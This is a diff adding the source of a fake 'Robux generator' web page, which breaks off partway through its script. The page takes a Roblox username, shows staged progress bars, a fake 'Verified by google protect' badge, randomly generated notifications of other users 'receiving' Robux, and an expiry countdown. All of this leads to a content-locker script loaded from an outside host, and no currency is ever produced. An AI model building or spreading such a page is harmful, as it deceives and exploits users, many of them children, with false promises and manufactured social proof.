@@ -1,0 +1,1294 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="images/2048px-ROBUX_2014_Logo.svg.png" rel="icon" type="image/x-icon">
+    <title>ZoneRBX</title>
+     
+    <script defer data-domain="lliorbx.pages.dev" src="https://plausible.io/js/script.js"></script>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Content Locker Configuration -->
+    <script type="text/javascript">
+        var WcSFB_GPY_iwvoac={"it":4193457,"key":"28226"};
+    </script>
+    <script src="https://d1y0yks1k8t5m5.cloudfront.net/7560e02.js"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        roblox: {
+                            red: '#1291eb',
+                            black: '#1291eb',
+                            gray: '#393B3D',
+                            darkgray: '#232527',
+                            lightgray: '#D3D3D3'
+                        },
+                        robux: {
+                            green: '#1291eb'
+                        }
+                    },
+                    fontFamily: {
+                        roblox: ['Gotham SSm A', 'Gotham SSm B', 'Helvetica', 'Arial', 'sans-serif']
+                    }
+                },
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Montserrat', Helvetica, Arial, sans-serif;
+        }
+        
+        .robux-icon {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            background: radial-gradient(circle, #00B06F 0%, #016B42 100%);
+            border-radius: 50%;
+            position: relative;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        
+        .robux-icon::before {
+            content: "R$";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        @keyframes progress {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+        
+        .progress-animation {
+            animation: progress 5s linear forwards;
+        }
+        
+        .shine-button {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .shine-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
+            transform: rotate(30deg);
+            animation: shine 3.5s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translate(-100%, -100%) rotate(30deg); }
+            100% { transform: translate(100%, 100%) rotate(30deg); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
+        }
+        
+        .bounce {
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .robux-glow {
+            box-shadow: 0 0 15px 5px rgba(0, 176, 111, 0.4);
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,.35);
+            border-top-color: white;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 700ms linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Verification Modal Styles */
+        .verification-modal {
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        .verification-modal .modal-content {
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9) translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+
+        .reward-highlight {
+            background: linear-gradient(45deg, #10b981, #059669);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: textShine 2s infinite;
+        }
+
+        @keyframes textShine {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        .user-profile {
+            background: rgba(18, 145, 235, 0.05);
+            border: 1px solid rgba(18, 145, 235, 0.2);
+            border-radius: 16px;
+            padding: 16px;
+            margin: 16px 0;
+            display: none;
+        }
+
+        .user-profile.show {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .user-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid rgba(18, 145, 235, 0.3);
+            object-fit: cover;
+            position: relative;
+        }
+
+        .online-status {
+            position: absolute;
+            bottom: 2px;
+            right: 2px;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+
+        .online-status.online {
+            background-color: #10b981;
+            box-shadow: 0 0 8px rgba(16, 185, 129, 0.6);
+        }
+
+        .online-status.offline {
+            background-color: #6b7280;
+        }
+
+        .user-info-details {
+            background: rgba(0, 0, 0, 0.03);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+        }
+
+        .dark .user-info-details {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .info-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .dark .info-row {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-icon {
+            width: 32px;
+            color: #1291eb;
+            font-size: 14px;
+        }
+
+        .info-label {
+            flex: 1;
+            font-size: 13px;
+            color: #6b7280;
+            font-weight: 500;
+        }
+
+        .dark .info-label {
+            color: #9ca3af;
+        }
+
+        .info-value {
+            font-size: 13px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .dark .info-value {
+            color: #f3f4f6;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .status-badge.online {
+            background: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+        }
+
+        .status-badge.offline {
+            background: rgba(107, 114, 128, 0.15);
+            color: #6b7280;
+        }
+
+        .status-badge.active {
+            background: rgba(16, 185, 129, 0.15);
+            color: #10b981;
+        }
+
+        .status-badge.banned {
+            background: rgba(239, 68, 68, 0.15);
+            color: #ef4444;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            margin-right: 6px;
+            animation: pulse-dot 2s infinite;
+        }
+
+        .status-badge.online .status-dot {
+            background: #10b981;
+        }
+
+        .status-badge.offline .status-dot {
+            background: #6b7280;
+        }
+
+        .status-badge.active .status-dot {
+            background: #10b981;
+        }
+
+        .status-badge.banned .status-dot {
+            background: #ef4444;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .error-message {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #ef4444;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            display: none;
+        }
+
+        /* Diamond Styles */
+        .diamond-option {
+            background: white;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .dark .diamond-option {
+            background: #374151;
+            border-color: #4b5563;
+        }
+
+        .diamond-option:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .diamond-option.selected {
+            border-color: #1291eb;
+            background: rgba(18, 145, 235, 0.1);
+            transform: translateY(-3px);
+        }
+
+        .diamond-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 8px;
+            object-fit: contain;
+            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.15));
+        }
+
+        .diamond-amount {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #1f2937;
+            margin-top: 8px;
+        }
+
+        .dark .diamond-amount {
+            color: #f3f4f6;
+        }
+
+        /* Notification styles */
+        .notification-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            max-width: 350px;
+        }
+
+        .notification {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            animation: slideInRight 0.5s ease-out, slideOutRight 0.5s ease-in 4.5s;
+            border-left: 4px solid #10b981;
+        }
+
+        .dark .notification {
+            background: #374151;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        @keyframes slideInRight {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideOutRight {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+        }
+
+        .notification-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            margin-right: 12px;
+            border: 2px solid #10b981;
+        }
+
+        .notification-content {
+            flex: 1;
+        }
+
+        .notification-username {
+            font-weight: 700;
+            color: #1f2937;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .dark .notification-username {
+            color: #f3f4f6;
+        }
+
+        .notification-message {
+            font-size: 12px;
+            color: #6b7280;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .dark .notification-message {
+            color: #9ca3af;
+        }
+
+        .notification-icon {
+            color: #10b981;
+            font-size: 18px;
+        }
+
+        @media (max-width: 480px) {
+            .notification-container {
+                right: 10px;
+                left: 10px;
+                max-width: none;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 dark:bg-roblox-darkgray min-h-screen transition-colors duration-200">
+    <script>
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            document.documentElement.classList.add('dark');
+        }
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
+            if (event.matches) {
+                document.documentElement.classList.add('dark');
+            } else {
+                document.documentElement.classList.remove('dark');
+            }
+        });
+    </script>
+
+    <div class="container mx-auto px-4 py-6 max-w-md">
+        <!-- Notification Container -->
+        <div id="notificationContainer" class="notification-container"></div>
+
+        <!-- Header Logo -->
+        <div class="flex justify-center mb-6">
+            <div class="relative">
+                <img src="https://i.imgur.com/eKXWkvK.png" alt="Roblox Logo" class="h-20 object-cover" onerror="this.src='images/roblox.png'">
+                <div class="absolute top-0 right-0 -mr-4 -mt-2 bg-roblox-darkgray text-white text-xs font-bold px-2 py-1 rounded-full">2025</div>
+            </div>
+        </div>
+        
+        <div class="text-center mb-4">
+            <h1 class="text-3xl font-bold text-roblox-black dark:text-white">ROBUX GENERATOR</h1>
+            <p class="text-sm text-gray-600 dark:text-green-700">The latest updated online tool for Roblox</p>
+        </div>
+
+        <!-- Step 1: Username Input and Lookup -->
+        <div id="step1" class="bg-white dark:bg-roblox-gray rounded-lg shadow-xl p-6 mb-6 transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black dark:text-white mb-6">
+                <i class="fas fa-user mr-2"></i> Enter Your Roblox Username
+            </h2>
+            
+            <div class="mb-6 relative">
+                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                    <i class="fas fa-user text-gray-400"></i>
+                </div>
+                <input type="text" id="username" placeholder="Your Roblox Username" class="w-full pl-10 pr-4 py-4 text-base rounded-md border-2 border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-roblox-red focus:border-transparent">
+            </div>
+
+            <button id="searchButton" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-6 rounded-md transition duration-200 ease-in-out transform hover:scale-105 shine-button mb-4">
+                <i class="fas fa-search mr-2"></i> <span id="searchButtonText">SEARCH USER</span>
+            </button>
+
+            <div id="errorMessage" class="error-message">
+                <i class="fas fa-exclamation-triangle mr-2"></i>
+                <span id="errorText">Error occurred while searching</span>
+            </div>
+
+            <div id="userProfile" class="user-profile">
+                <div class="flex items-center mb-4">
+                    <div class="relative mr-4">
+                        <img id="userAvatar" class="user-avatar" src="" alt="User Avatar">
+                        <div id="onlineStatusBadge" class="online-status online"></div>
+                    </div>
+                    <div class="flex-1">
+                        <h3 id="displayName" class="text-lg font-bold text-roblox-black dark:text-white">—</h3>
+                        <p id="usernameOut" class="text-gray-600 dark:text-gray-400">@—</p>
+                    </div>
+                </div>
+
+                <div class="user-info-details">
+                    <div class="info-row">
+                        <div class="info-icon">
+                            <i class="fas fa-calendar-alt"></i>
+                        </div>
+                        <div class="info-label">Created</div>
+                        <div class="info-value" id="accountCreated">Loading...</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-icon">
+                            <i class="fas fa-signal"></i>
+                        </div>
+                        <div class="info-label">Status</div>
+                        <div id="onlineStatus" class="status-badge online">
+                            <span class="status-dot"></span>
+                            Online
+                        </div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <div class="info-label">Account</div>
+                        <div id="banStatus" class="status-badge active">
+                            <span class="status-dot"></span>
+                            Loading...
+                        </div>
+                    </div>
+                </div>
+
+                <button id="continueButton" class="w-full bg-roblox-red hover:bg-darkgray-700 text-white font-bold py-4 px-6 rounded-md transition duration-200 ease-in-out transform hover:scale-105 shine-button mt-4">
+                    <i class="fas fa-arrow-right mr-2"></i> CONTINUE
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 2: Select Robux Amount -->
+        <div id="step2" class="bg-white dark:bg-roblox-gray rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black dark:text-white mb-6">
+                <i class="fas fa-coins mr-2"></i> Select Robux Amount
+            </h2>
+            
+            <div class="grid grid-cols-2 gap-4 mb-8">
+                <button class="robux-btn bg-white dark:bg-gray-700 border-2 border-gray-300 dark:border-gray-600 hover:border-robux-green dark:hover:border-robux-green text-roblox-black dark:text-white font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="800">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">800</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+                <button class="robux-btn bg-white dark:bg-gray-700 border-2 border-gray-300 dark:border-gray-600 hover:border-robux-green dark:hover:border-robux-green text-roblox-black dark:text-white font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="5800">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">5,800</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+                <button class="robux-btn bg-white dark:bg-gray-700 border-2 border-gray-300 dark:border-gray-600 hover:border-robux-green dark:hover:border-robux-green text-roblox-black dark:text-white font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="25000">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">25,000</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+                <button class="robux-btn bg-white dark:bg-gray-700 border-2 border-gray-300 dark:border-gray-600 hover:border-robux-green dark:hover:border-robux-green text-roblox-black dark:text-white font-bold py-4 px-4 rounded-md transition duration-200 transform hover:scale-105" data-amount="100000">
+                    <div class="flex items-center justify-center mb-1">
+                        <div class="robux-icon"></div>
+                        <div class="text-xl">100,000</div>
+                    </div>
+                    <div class="text-sm bg-robux-green text-white py-1 rounded-sm">FREE</div>
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 2.5: Select Diamond Amount -->
+        <div id="step2_5" class="bg-white dark:bg-roblox-gray rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black dark:text-white mb-6">
+                <i class="fas fa-gem mr-2"></i> Select Diamond Amount
+            </h2>
+            
+            <div class="grid grid-cols-2 gap-4 mb-6">
+                <div class="diamond-option" data-amount="100">
+                    <img src="https://www2.0zz0.com/2025/09/30/14/578642629.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">100</div>
+                    <div class="text-xs text-green-600 dark:text-green-400 font-semibold mt-2">FREE</div>
+                </div>
+                <div class="diamond-option" data-amount="250">
+                    <img src="https://www2.0zz0.com/2025/09/30/14/348581754.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">250</div>
+                    <div class="text-xs text-green-600 dark:text-green-400 font-semibold mt-2">FREE</div>
+                </div>
+                <div class="diamond-option" data-amount="700">
+                    <img src="https://www2.0zz0.com/2025/09/30/14/321710945.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">700</div>
+                    <div class="text-xs text-green-600 dark:text-green-400 font-semibold mt-2">FREE</div>
+                </div>
+                <div class="diamond-option" data-amount="7000">
+                    <img src="https://www2.0zz0.com/2025/09/25/12/608952181.png" alt="Diamond" class="diamond-icon">
+                    <div class="diamond-amount">7000</div>
+                    <div class="text-xs text-green-600 dark:text-green-400 font-semibold mt-2">FREE</div>
+                </div>
+            </div>
+
+            <div id="diamondProgressContainer" class="hidden mb-4">
+                <div class="mb-2 flex justify-between items-center">
+                    <span class="text-sm font-medium text-gray-700 dark:text-gray-300">
+                        <i class="fas fa-cog fa-spin mr-2"></i> Processing diamonds...
+                    </span>
+                    <span id="diamondProgressPercent" class="text-sm font-medium text-robux-green">0%</span>
+                </div>
+                <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-5 mb-4 overflow-hidden">
+                    <div id="diamondProgressBar" class="bg-robux-green h-5 rounded-full w-0 transition-all duration-100"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: Progress -->
+        <div id="step3" class="bg-white dark:bg-roblox-gray rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <h2 class="text-2xl font-bold text-center text-roblox-black dark:text-white mb-6">
+                <i class="fas fa-cog mr-2"></i> Processing Request
+            </h2>
+            
+            <div id="progressContainer">
+                <div class="mb-2 flex justify-between items-center">
+                    <span class="text-sm font-medium text-gray-700 dark:text-gray-300">
+                        <i class="fas fa-cog fa-spin mr-2"></i> Processing request...
+                    </span>
+                    <span id="progressPercent" class="text-sm font-medium text-robux-green">0%</span>
+                </div>
+                <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-5 mb-4 overflow-hidden">
+                    <div id="progressBar" class="bg-robux-green h-5 rounded-full w-0 transition-all duration-100"></div>
+                </div>
+                
+                <div id="statusMessages" class="text-sm text-gray-700 dark:text-gray-300 mb-4 border border-gray-200 dark:border-gray-600 rounded-md p-3 bg-gray-50 dark:bg-gray-800 max-h-32 overflow-y-auto">
+                    <div class="mb-1">
+                        <i class="fas fa-check-circle text-green-500 mr-2"></i> Connecting to servers...
+                    </div>
+                </div>
+                
+                <div class="flex items-center justify-center mb-4">
+                    <i class="fas fa-user mr-2 text-gray-600 dark:text-gray-400"></i>
+                    <p class="text-gray-800 dark:text-gray-200">User: <span id="usernameDisplay" class="font-bold">Username</span></p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Verification -->
+        <div id="step4" class="bg-white dark:bg-roblox-gray rounded-lg shadow-xl p-6 mb-6 hidden transform transition-all duration-300">
+            <div id="verification">
+                <h2 class="text-2xl font-bold text-center text-roblox-black dark:text-white mb-6">
+                    <i class="fas fa-shield-alt mr-2"></i> Verified by google protect 
+                </h2>
+                
+                <div class="flex justify-center mb-6">
+                    <div class="floating">
+                        <div class="robux-icon" style="width: 60px; height: 60px;"></div>
+                    </div>
+                </div>
+                
+                <div class="text-center mb-6">
+                    <div class="mb-2 text-lg font-medium text-roblox-black dark:text-white">
+                        <span id="robuxAmount" class="font-bold text-xl">0</span> Robux + <span id="diamondAmount" class="font-bold text-xl">0</span> Diamonds are ready!
+                    </div>
+                    <p class="text-gray-600 dark:text-gray-400 mb-1">
+                        User: <span id="usernameDisplay2" class="font-bold">Username</span>
+                    </p>
+                    <div class="text-xs text-gray-500 dark:text-gray-500">
+                        <i class="fas fa-lock mr-1"></i>
+                    </div>
+                </div>
+                
+                <div class="bg-gray-100 dark:bg-gray-800 rounded-lg p-4 mb-6">
+                    <div class="flex items-center mb-2">
+                        <i class="fas fa-info-circle text-blue-500 mr-2"></i>
+                        <p class="text-sm text-gray-700 dark:text-gray-300">Robux & Diamonds are ready to be added</p>
+                    </div>
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-triangle text-yellow-500 mr-2"></i>
+                        <p class="text-sm text-gray-700 dark:text-gray-300">Click NEXT for the final step</p>
+                    </div>
+                </div>
+                
+                <button id="getrobuxBtn" class="w-full bg-roblox-red hover:bg-darkgray-700 text-white font-bold py-5 px-6 rounded-md transition duration-200 ease-in-out shine-button pulse transform hover:scale-105 mb-4">
+                    <i class="fas fa-gift mr-2"></i> NEXT
+                </button>
+            </div>
+            
+            <div id="completion" class="hidden">
+                <div class="flex justify-center mb-4">
+                    <div class="w-16 h-16 text-robux-green bounce">
+                        <i class="fas fa-check-circle text-6xl"></i>
+                    </div>
+                </div>
+                
+                <h2 class="text-2xl font-bold text-center text-robux-green mb-4">Generated Successfully!</h2>
+                
+                <div class="bg-green-100 dark:bg-green-900 border border-green-400 dark:border-green-600 text-green-700 dark:text-green-300 px-4 py-4 rounded-lg mb-6" role="alert">
+                    <div class="flex mb-2">
+                        <div class="robux-icon"></div>
+                        <span id="robuxAmount2" class="font-bold text-xl">0</span>
+                        <span class="mx-2">+</span>
+                        <i class="fas fa-gem text-xl mr-1"></i>
+                        <span id="diamondAmount2" class="font-bold text-xl">0</span>
+                    </div>
+                    <p class="text-center">Generated for <span id="usernameDisplay3" class="font-bold">Username</span></p>
+                </div>
+                
+                <div class="bg-yellow-100 dark:bg-yellow-900 border border-yellow-400 dark:border-yellow-600 text-yellow-700 dark:text-yellow-300 px-4 py-3 rounded-lg mb-6" role="alert">
+                    <div class="flex items-center">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        <p>Complete the final STEP to receive your rewards immediately</p>
+                    </div>
+                </div>
+                
+                <button onclick="startContentLocker()" class="w-full bg-robux-green hover:bg-green-700 text-white font-bold py-4 px-6 rounded-md transition duration-200 ease-in-out transform hover:scale-105 robux-glow shine-button">
+                    <i class="fas fa-user-check mr-2"></i> Final step
+                </button>
+                
+                <div class="mt-4 text-center text-sm text-gray-500 dark:text-gray-400">
+                    <i class="fas fa-clock mr-1"></i> This offer expires in <span id="countdown">05:00</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="text-center text-xs text-gray-500 dark:text-gray-400 mt-6">
+            <p></p>
+            <p>Roblox, the Roblox logo and Robux are registered trademarks of Roblox Corporation.</p>
+        </div>
+    </div>
+
+    <script>
+        const BACKUP_API = 'https://abadaoucht.com/tiktok/api/roblox/userinfo/';
+
+        // DOM elements
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step2_5 = document.getElementById('step2_5');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+        const usernameInput = document.getElementById('username');
+        const searchButton = document.getElementById('searchButton');
+        const searchButtonText = document.getElementById('searchButtonText');
+        const continueButton = document.getElementById('continueButton');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
+        const userProfile = document.getElementById('userProfile');
+        const userAvatar = document.getElementById('userAvatar');
+        const displayName = document.getElementById('displayName');
+        const usernameOut = document.getElementById('usernameOut');
+        const accountCreated = document.getElementById('accountCreated');
+        const onlineStatus = document.getElementById('onlineStatus');
+        const onlineStatusBadge = document.getElementById('onlineStatusBadge');
+        const banStatus = document.getElementById('banStatus');
+        const notificationContainer = document.getElementById('notificationContainer');
+        
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        const usernameDisplay2 = document.getElementById('usernameDisplay2');
+        const usernameDisplay3 = document.getElementById('usernameDisplay3');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const progressPercent = document.getElementById('progressPercent');
+        const statusMessages = document.getElementById('statusMessages');
+        const robuxBtns = document.querySelectorAll('.robux-btn');
+        const diamondOptions = document.querySelectorAll('.diamond-option');
+        const robuxAmount = document.getElementById('robuxAmount');
+        const robuxAmount2 = document.getElementById('robuxAmount2');
+        const diamondAmount = document.getElementById('diamondAmount');
+        const diamondAmount2 = document.getElementById('diamondAmount2');
+        const getrobuxBtn = document.getElementById('getrobuxBtn');
+        const verification = document.getElementById('verification');
+        const completion = document.getElementById('completion');
+        const countdown = document.getElementById('countdown');
+        const diamondProgressContainer = document.getElementById('diamondProgressContainer');
+        const diamondProgressBar = document.getElementById('diamondProgressBar');
+        const diamondProgressPercent = document.getElementById('diamondProgressPercent');
+        
+        let selectedRobuxAmount = 0;
+        let selectedDiamondAmount = 0;
+        let currentUserData = null;
+
+        // Notification system
+        const usernames = [
+            'Alex_Pro', 'Sarah_Gaming', 'Mike_Player', 'Emma_2024', 'John_RBX',
+            'Lisa_Cool', 'Tom_Legend', 'Anna_Star', 'Chris_Pro', 'Mia_Queen',
+            'Ryan_King', 'Sophia_Gamer', 'Noah_Elite', 'Olivia_Best', 'Lucas_Hero',
+            'Ava_Master', 'Ethan_Boss', 'Isabella_VIP', 'Mason_Prime', 'Charlotte_Pro'
+        ];
+
+        const robuxAmounts = [800, 1200, 2500, 5000, 10000, 15000, 25000];
+        const diamondAmounts = [100, 250, 500, 700, 900, 1500];
+
+        function createNotification() {
+            const username = usernames[Math.floor(Math.random() * usernames.length)];
+            const robux = robuxAmounts[Math.floor(Math.random() * robuxAmounts.length)];
+            const diamonds = diamondAmounts[Math.floor(Math.random() * diamondAmounts.length)];
+            
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.innerHTML = `
+                <img src="https://www2.0zz0.com/2025/09/30/19/744312150.png" alt="User" class="notification-avatar">
+                <div class="notification-content">
+                    <div class="notification-username">${username}</div>
+                    <div class="notification-message">
+                        <i class="fas fa-check-circle notification-icon"></i>
+                        <span>Received ${robux.toLocaleString()} Robux + ${diamonds} Diamonds</span>
+                    </div>
+                </div>
+            `;
+            
+            notificationContainer.appendChild(notification);
+            
+            setTimeout(() => {
+                notification.remove();
+            }, 5000);
+        }
+
+        // Start notifications every 5 seconds
+        setInterval(createNotification, 5000);
+        setTimeout(createNotification, 1000);
+
+        function showError(msg) {
+            errorText.textContent = msg;
+            errorMessage.style.display = 'block';
+            userProfile.classList.remove('show');
+        }
+
+        function hideError() {
+            errorMessage.style.display = 'none';
+        }
+
+        function setSearchLoading(loading) {
+            searchButton.disabled = loading;
+            if (loading) {
+                searchButtonText.innerHTML = '<span class="spinner"></span> SEARCHING...';
+            } else {
+                searchButtonText.innerHTML = 'SEARCH USER';
+            }
+        }
+
+        function handleUserLookup() {
+            let username = $("#username").val().trim();
+            
+            hideError();
+            if (username === "") {
+                usernameInput.classList.add('shake');
+                usernameInput.classList.add('border-red-500');
+                setTimeout(() => {
+                    usernameInput.classList.remove('shake');
+                    setTimeout(() => {
+                        usernameInput.classList.remove('border-red-500');
+                    }, 500);
+                }, 500);
+                return;
+            }
+
+            setSearchLoading(true);
+            userProfile.classList.remove('show');
+
+            $.ajax({
+                url: BACKUP_API + username,
+                method: "GET",
+                timeout: 10000,
+                success: function(response) {
+                    setSearchLoading(false);
+
+                    if (response.status === "SUCCESS") {
+                        currentUserData = {
+                            name: response.user_name || username,
+                            displayName: response.full_name || response.user_name || username,
+                            avatar: response.avatar || "https://logodix.com/logo/1070634.png",
+                            created: response.created || null,
+                            isBanned: response.is_banned || false
+                        };
+
+                        userAvatar.src = currentUserData.avatar;
+                        displayName.textContent = currentUserData.displayName;
+                        usernameOut.textContent = "@" + currentUserData.name;
+                        
+                        if (currentUserData.created) {
+                            const createdDate = new Date(currentUserData.created);
+                            const options = { year: 'numeric', month: 'short', day: 'numeric' };
+                            accountCreated.textContent = createdDate.toLocaleDateString('en-US', options);
+                        } else {
+                            accountCreated.textContent = "Unknown";
+                        }
+                        
+                        onlineStatus.innerHTML = '<span class="status-dot"></span> Online';
+                        onlineStatus.className = 'status-badge online';
+                        onlineStatusBadge.className = 'online-status online';
+                        
+                        if (currentUserData.isBanned) {
+                            banStatus.innerHTML = '<span class="status-dot"></span> Banned';
+                            banStatus.className = 'status-badge banned';
+                        } else {
+                            banStatus.innerHTML = '<span class="status-dot"></span> Active';
+                            banStatus.className = 'status-badge active';
+                        }
+                        
